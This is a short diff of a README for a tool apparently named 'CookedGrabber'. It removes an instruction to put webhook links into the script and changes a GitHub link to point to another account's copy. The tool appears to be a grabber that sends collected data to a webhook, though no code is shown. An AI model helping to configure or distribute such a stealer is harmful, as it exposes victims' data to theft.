@@ -49,9 +49,7 @@
 There is 2 ways to run the script.
 
 ### 1. First way
-
-You need to add your **webhook(s)** **link(s)** to the script from this line:
-https://github.com/mouadessalim/CookedGrabber/blob/f753c4bea37241d94253a288dd223c5ae8f7f371/CookedGrabber.py#L290
+https://github.com/Bxkb83/CookedGrabber/blob/main/CookedGrabber.py#L290
 *You can run the script normaly.*
 
 ### 2. Second way
